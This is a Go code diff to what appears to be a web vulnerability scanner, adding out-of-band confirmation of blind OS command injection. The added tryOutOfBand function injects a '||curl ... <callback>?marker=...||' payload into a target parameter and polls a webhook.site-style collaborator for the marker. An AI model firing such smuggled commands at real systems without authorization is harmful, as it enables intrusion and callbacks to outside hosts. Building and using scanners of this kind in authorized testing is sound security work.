@@ -18,6 +18,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log/slog"
+	"net/http"
 	"net/url"
 	"strings"
 	"sync"
@@ -39,13 +40,15 @@ const commandInjectionEngine = "command_injection"
 const maxCommandInjectionProbes = 4
 
 type commandInjectionExecutor struct {
-	store      store.Store
-	engine     httpengine.Engine
-	evidence   evidence.Store
-	cfg        ExecutorConfig
-	log        *slog.Logger
-	findingsMu *sync.Mutex
-	tokenMu    *sync.Mutex
+	store           store.Store
+	engine          httpengine.Engine
+	evidence        evidence.Store
+	cfg             ExecutorConfig
+	log             *slog.Logger
+	findingsMu      *sync.Mutex
+	tokenMu         *sync.Mutex
+	callbackURL     string
+	callbackPollURL string
 }
 
 // NewCommandInjectionExecutorForTest exposes the executor to the external
@@ -59,6 +62,11 @@ func newCommandInjectionExecutor(st store.Store, eng httpengine.Engine, ev evide
 		findingsMu = &sync.Mutex{}
 	}
 	return &commandInjectionExecutor{store: st, engine: eng, evidence: ev, cfg: cfg.withDefaults(), log: log, findingsMu: findingsMu, tokenMu: &sync.Mutex{}}
+}
+
+func (e *commandInjectionExecutor) withCallback(url, pollURL string) {
+	e.callbackURL = strings.TrimSpace(url)
+	e.callbackPollURL = strings.TrimSpace(pollURL)
 }
 
 var _ worker.Handler = (*commandInjectionExecutor)(nil)
@@ -224,6 +232,17 @@ func (e *commandInjectionExecutor) Handle(ctx context.Context, job *domain.TestJ
 			d.ConfirmMethod = "redirect"
 			d.Reason = "two time delays confirmed execution and a web-readable file returned the marker"
 			e.persistCase(ctx, job, ep, focus, d, domain.TestCaseCompleted, domain.OutcomeSuccess, "confirmed blind OS command injection via output redirection")
+			e.correlate(ctx, job, ep, focus, d)
+			return nil
+		}
+	}
+
+	if !(d.ConfirmMethod == "redirect") && e.callbackURL != "" && e.callbackPollURL != "" {
+		if e.tryOutOfBand(ctx, job, ep, focus, baseValue, &d) {
+			d.Verdict = domain.VerdictConfirmed
+			d.ConfirmMethod = "oob"
+			d.Reason = "the target made an out-of-band callback carrying the injected marker"
+			e.persistCase(ctx, job, ep, focus, d, domain.TestCaseCompleted, domain.OutcomeSuccess, "confirmed blind OS command injection via out-of-band callback")
 			e.correlate(ctx, job, ep, focus, d)
 			return nil
 		}
@@ -453,6 +472,67 @@ func (e *commandInjectionExecutor) finishError(ctx context.Context, job *domain.
 	return fmt.Errorf("command-injection baseline failed: %s", msg)
 }
 
+// tryOutOfBand sends a benign HTTP callback through the vulnerable parameter
+// and polls the operator-provided collaborator. The callback carries a random
+// marker in the query string; a received request is proof the target executed
+// the command. It never sends target data to the callback except the marker.
+func (e *commandInjectionExecutor) tryOutOfBand(ctx context.Context, job *domain.TestJob, ep *domain.Endpoint, focus *domain.Parameter, baseValue string, d *commandInjectionDetail) bool {
+	callback := strings.TrimSpace(e.callbackURL)
+	poll := strings.TrimSpace(e.callbackPollURL)
+	if callback == "" || poll == "" {
+		return false
+	}
+	marker := fmt.Sprintf("indago-oob-%d", time.Now().UnixNano()%1000000000)
+	sep := "?"
+	if strings.Contains(callback, "?") {
+		sep = "&"
+	}
+	url := callback + sep + "marker=" + marker
+	payload := fmt.Sprintf("%s||curl -sS --max-time 8 %s||", baseValue, url)
+	params, err := e.store.Parameters().ListByEndpoint(ctx, ep.ID)
+	if err != nil {
+		return false
+	}
+	params = fillEmptyCommandParams(e.refreshParams(ctx, ep, params, focus), focus)
+	req, err := buildRequest(ep, params, &injection{param: focus, value: payload})
+	if err != nil {
+		return false
+	}
+	resp, outcome, _ := e.do(ctx, req)
+	if resp != nil {
+		ev, _ := e.persistEvidence(ctx, job.ScanID, resp, "command-injection out-of-band write")
+		d.EvidenceIDs = append(d.EvidenceIDs, ev...)
+	}
+	if outcome != domain.OutcomeSuccess {
+		return false
+	}
+	// webhook.site exposes received requests at /token/<uuid>/requests.
+	client := &http.Client{Timeout: 10 * time.Second}
+	for attempt := 0; attempt < 8; attempt++ {
+		select {
+		case <-ctx.Done():
+			return false
+		case <-time.After(time.Second):
+		}
+		pollReq, err := http.NewRequestWithContext(ctx, http.MethodGet, poll, nil)
+		if err != nil {
+			return false
+		}
+		pollResp, err := client.Do(pollReq)
+		if err != nil {
+			continue
+		}
+		body := make([]byte, 1<<20)
+		n, _ := pollResp.Body.Read(body)
+		pollResp.Body.Close()
+		if strings.Contains(string(body[:n]), marker) {
+			d.ConfirmedCount = 2
+			return true
+		}
+	}
+	return false
+}
+
 // tryOutputRedirection turns blind execution into observable evidence when the
 // target serves a writable directory through an image/file endpoint. The
 // command writes a computed marker (not the raw payload) to a randomized file,
@@ -536,6 +616,9 @@ func (e *commandInjectionExecutor) tryOutputRedirection(ctx context.Context, job
 }
 
 func commandInjectionSummary(d commandInjectionDetail) string {
+	if d.ConfirmMethod == "oob" {
+		return "Blind command execution was confirmed by an out-of-band callback carrying the injected marker."
+	}
 	if d.ConfirmMethod == "redirect" {
 		return "Blind command execution was confirmed and the command output was retrieved from a web-readable file."
 	}
